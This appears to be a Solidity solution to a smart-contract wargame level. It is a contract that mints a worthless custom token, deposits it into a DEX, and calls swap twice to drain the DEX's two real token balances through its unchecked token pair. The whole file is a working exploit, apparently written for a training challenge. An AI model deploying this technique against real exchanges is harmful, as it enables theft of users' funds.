// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Level23 {
    function attack(address dex) public {
        MyToken token = new MyToken();
        address token1 = 0x8a287978005C6415c4ba2a08E432BC9583baF11b;
        address token2 = 0x47448CA1ea5F82C162f447f93e7d769218695905;
        token.approve(dex, 300);
        token.transfer(dex, 100);
        address(dex).call(abi.encodeWithSignature("swap(address,address,uint256)", address(token), token1, 100));
        address(dex).call(abi.encodeWithSignature("swap(address,address,uint256)", address(token), token2, 200));
    }
}

contract MyToken is ERC20 {
    constructor() ERC20("aa", "aaa") {
        _mint(msg.sender, 400);
    }
}
